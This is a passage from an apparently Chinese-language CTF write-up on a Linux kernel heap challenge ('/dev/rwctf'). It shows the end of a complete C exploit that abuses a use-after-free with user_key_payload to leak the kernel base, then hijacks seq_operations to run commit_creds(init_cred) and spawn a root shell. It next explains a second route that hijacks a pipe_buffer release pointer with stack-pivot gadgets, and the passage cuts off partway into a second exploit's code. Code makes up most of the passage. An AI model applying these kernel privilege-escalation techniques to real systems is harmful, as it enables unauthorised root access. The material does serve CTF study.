CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> rw_fd;</span><br><span class="line"><span class="type">int</span> seq_fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> idx, <span class="type">int</span> size, <span class="type">char</span>* ptr)</span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">n</span> =</span> &#123; .idx = idx, .size = size, .ptr = ptr &#125;;</span><br><span class="line">        ioctl(rw_fd, <span class="number">0xDEADBEEF</span>, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">dele</span><span class="params">(<span class="type">int</span> idx)</span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">n</span> =</span> &#123; .idx = idx &#125;;</span><br><span class="line">        ioctl(rw_fd, <span class="number">0xC0DECAFE</span>, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">key_alloc</span><span class="params">(<span class="type">char</span> *description, <span class="type">char</span> *payload, <span class="type">size_t</span> plen)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_add_key, <span class="string">&quot;user&quot;</span>, description, payload, plen,</span><br><span class="line">                   KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">key_read</span><span class="params">(<span class="type">int</span> keyid, <span class="type">char</span> *buffer, <span class="type">size_t</span> buflen)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">key_revoke</span><span class="params">(<span class="type">int</span> keyid)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span>&#123;</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> res;</span><br><span class="line">    <span class="type">size_t</span> kernel_offset;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"> </span><br><span class="line">    rw_fd = open(<span class="string">&quot;/dev/rwctf&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (rw_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;Failed to open /dev/rwctf&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x40</span>, buf); <span class="comment">// obj0</span></span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x40</span>, buf); <span class="comment">// obj1</span></span><br><span class="line">    <span class="comment">// freelist 0x40 : obj2</span></span><br><span class="line">    dele(<span class="number">1</span>);</span><br><span class="line">    dele(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// freelist 0x40 : obj0 -&gt; obj1 -&gt; obj2</span></span><br><span class="line">    <span class="type">int</span> k0 = key_alloc(<span class="string">&quot;pwner0&quot;</span>, buf, <span class="number">0x40</span><span class="number">-0x18</span>); <span class="comment">// user_key_payload0 : obj1</span></span><br><span class="line">    <span class="type">int</span> k1 = key_alloc(<span class="string">&quot;pwner1&quot;</span>, buf, <span class="number">0x40</span><span class="number">-0x18</span>); <span class="comment">// user_key_payload1 : obj2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// freelist 0x40 : obj0</span></span><br><span class="line">    key_revoke(k1);</span><br><span class="line">    <span class="comment">// freelist 0x40 : obj2 -&gt; obj0</span></span><br><span class="line">    dele(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// freelist 0x40 : obj1 -&gt; obj2 -&gt; obj0</span></span><br><span class="line">    buf[<span class="number">0</span>] = buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">2</span>] = <span class="number">0x100</span>*<span class="number">8</span>;  <span class="comment">// user_key_payload-&gt;datalen = 0x800</span></span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x40</span> , buf);</span><br><span class="line">    <span class="comment">// freelist 0x40 : obj2 -&gt; obj0</span></span><br><span class="line">    res = key_read(k0, buf, <span class="number">0x100</span>*<span class="number">8</span>);</span><br><span class="line">    kernel_offset = buf[<span class="number">6</span>] - USER_FREE_PAYLOAD_RCU;</span><br><span class="line">    binary_dump(<span class="string">&quot;user_key_payload data&quot;</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">    hexx(<span class="string">&quot;kernel_offset&quot;</span>, kernel_offset);</span><br><span class="line"> </span><br><span class="line">    pop_rdi += kernel_offset;</span><br><span class="line">    init_cred += kernel_offset;</span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    swapgs_kpti += kernel_offset;</span><br><span class="line">    add_rsp_xx += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;add_rsp_xx&quot;</span>, add_rsp_xx);</span><br><span class="line">    hexx(<span class="string">&quot;pop_rdi&quot;</span>, pop_rdi);</span><br><span class="line">    hexx(<span class="string">&quot;init_cred&quot;</span>, init_cred);</span><br><span class="line">    hexx(<span class="string">&quot;commit_creds&quot;</span>, commit_creds);</span><br><span class="line">    hexx(<span class="string">&quot;swapgs_kpti&quot;</span>, swapgs_kpti);</span><br><span class="line"> </span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x20</span>, buf);</span><br><span class="line">    dele(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    dele(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x20</span>, &amp;add_rsp_xx);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;mov r15, pop_rdi;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, swapgs_kpti;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    read(seq_fd, buf, <span class="number">8</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3><p>上面的思路一利用了<code>pt_regs</code>结构体，但是在内核开启了<code>CONFIG_RANDOMIZE_KSTACK_OFFSET=y</code>保护后该手法的利用难度会大大加大，所以这里利用了另外一种思路，即利用内核密钥管理来泄露内核地址和<code>pipe</code>管道来劫持控制程序流。首先给出部分<code>pipe</code>管道结构体源码</p><h4 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line"><span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当我们创建一个管道时，内核会创建一个<code>VFS inode</code>与一个<code>pipe_inode_info</code>结构体，其中<code>pipe_inode_info-&gt;bufs</code>指向<code>pipe_buffer</code>结构体数组，因此我们可以利用他来泄露出内核的堆上地址<br>当我们创建一个管道时，在内核中会分配一个<code>pipe_buffer</code>结构体数组，申请的内存总大小刚好会让内核从<code>kmalloc-1k</code>中取出一个<code>object</code>。<code>pipe_buffer</code>的<code>page</code>指针指向一个<code>page</code>结构体，而这个<code>page</code>结构体对应着一个内存页，这个内存页是<code>pipe_buffer</code>用来存取数据的<code>buffer</code>。该内存页是在第一次向<code>pipe_buffer</code>中写入数据的时候分配<br>总的来说，<code>pipe_inode_info</code>维护了一个<code>pipe_buffer</code>组成的双端队列，下面借用<code>sky123</code>师傅的图片</p><img src="/2024/01/24/linux%20kernel%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/1.png" class="" title="我的图图呢">  <p>每一个<code>pipe_buffer</code>中的<code>offset</code>和<code>len</code>标记了<code>pipe_buffer</code>对应内存页中的数据，还是借用<code>sky123</code>师傅的图片</p><img src="/2024/01/24/linux%20kernel%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/2.png" class="" title="我的图图呢">  <p>当我们关闭了管道的两端时，会触发<code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code>这一函数指针</p><h4 id="pipe-buf-operations"><a href="#pipe-buf-operations" class="headerlink" title="pipe_buf_operations"></a>pipe_buf_operations</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line"><span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"><span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"><span class="type">bool</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"><span class="type">bool</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以我们可以劫持该<code>release</code>指针。当程序运行到调用<code>release</code>指针时，<code>rsi</code>指针指向调用该<code>rlease</code>的<code>pipe_buffer</code>结构体，所以我们可以直接在<code>pipe_buffer</code>中写好<code>rop</code>链，利用<code>rsi</code>来栈迁移执行我们的<code>rop</code>链<br>现在回到题目中，由于前面我们提到过 <code>add_key()</code> 会先分配一个临时的 <code>obj1</code> 拷贝 <code>payload</code> 后再分配一个 <code>obj2</code> 作为 <code>user_key_payload</code>，若我们先分配一个 <code>obj</code> 并释放后再调用 <code>add_key()</code> 则该 <code>obj</code> 不会直接成为 <code>user_key_payload</code> ，而是会在后续的数次分配中都作为拷贝 <code>payload</code> 的临时 <code>obj</code> 存在。我们可以利用堆喷来实现将当前索引的<code>obj</code>成为<code>user_key_payload</code>，流程为（来自<code>arttnba3</code>师傅博客）：</p><ul><li>利用题目功能构建 <code>UAF object</code></li><li>堆喷射 <code>user_key_payload</code> ，<code>UAF obj</code> 作为拷贝 <code>payload</code> 的临时 <code>obj</code> 存在</li><li><code>kmem_cache_cpu</code> 的 <code>slub page</code> 耗光，向 <code>node</code> 请求新的 <code>slub page</code> 分配 <code>user_key_payload</code> ，完成后 <code>UAF obj</code> 被释放并回到 <code>kmem_cache_node</code></li><li>继续堆喷 <code>user_key_payload</code> ，<code>kmem_cache_cpu</code> 的 <code>slub page</code> 耗光，向 <code>node</code> 请求新的 <code>slub page</code> 分配 <code>user_key_payload</code></li><li><code>UAF obj</code> 所在页面被取回，<code>UAF obj</code> 被分配为 <code>user_key_payload</code></li><li>利用题目功能再次释放 <code>UAF obj</code>，利用题目功能进行堆喷获取到该 <code>obj</code>，从而覆写 <code>user_key_payload</code></li></ul><p>我们可以另<code>user_key_payload</code>与<code>pipe_inode_info</code>占用同一个<code>object</code>，这样 <code>pipe_inode_info</code> 刚好会将 <code>user_key_payload-&gt;datalen</code> 改为 <code>0xFFFF</code> 使得我们能够继续读取数据，从而读取 <code>pipe_inode_info</code> 以泄露出 <code>pipe_buffer</code> 的地址<br>最后我们直接在<code>pipe_inode_info</code>中布置好<code>fake pipe_buffer_operations</code>和<code>rop</code>链，最后通过关闭管道的两端来劫持程序流来执行我们的<code>rop</code>链进而提权，这里利用了下面<code>2</code>个<code>gadget</code>相互配合来实现栈迁移：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffa4250ca4:  pop    rbx</span><br><span class="line">0xffffffffa4250ca5:  xor    eax,eax</span><br><span class="line">0xffffffffa4250ca7:  pop    rbp</span><br><span class="line">0xffffffffa4250ca8:  pop    r12</span><br><span class="line">0xffffffffa4250caa:  ret</span><br><span class="line"></span><br><span class="line">0xffffffffa4250c9d:  push   rsi</span><br><span class="line">0xffffffffa4250c9e:  pop    rsp</span><br><span class="line">0xffffffffa4250c9f:  cmp    rcx,rdx</span><br><span class="line">0xffffffffa4250ca2:  jb     0xffffffffa4250c85</span><br><span class="line">0xffffffffa4250ca4:  pop    rbx</span><br><span class="line">0xffffffffa4250ca5:  xor    eax,eax</span><br><span class="line">0xffffffffa4250ca7:  pop    rbp</span><br><span class="line">0xffffffffa4250ca8:  pop    r12</span><br><span class="line">0xffffffffa4250caa:  ret</span><br></pre></td></tr></table></figure><p>脚本好像不太稳定，大概百分之<code>30</code>的概率能成功提权</p><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -static -masm=intel -pthread exp.c -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_SPRAY_NUM 40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_INODE_INFO_SZ 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_BUFFER_SZ 1024</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USER_FREE_PAYLOAD_RCU 0xFFFFFFFF813D8210</span></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff81096110</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff81095c30</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81e00ed0</span>;</span><br><span class="line"><span class="type">size_t</span> push_rsi_pop_rsp_pop_rbx_pop_rbp_pop_r12_ret = <span class="number">0xffffffff81250c9d</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rbx_pop_rbp_pop_r12_ret = <span class="number">0xffffffff81250ca4</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff8106ab4d</span>;</span><br><span class="line"><span class="type">size_t</span> xchg_rdi_rax_dec_sth_ret = <span class="number">0xffffffff81adfc70</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="type">char</span>* ptr;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span 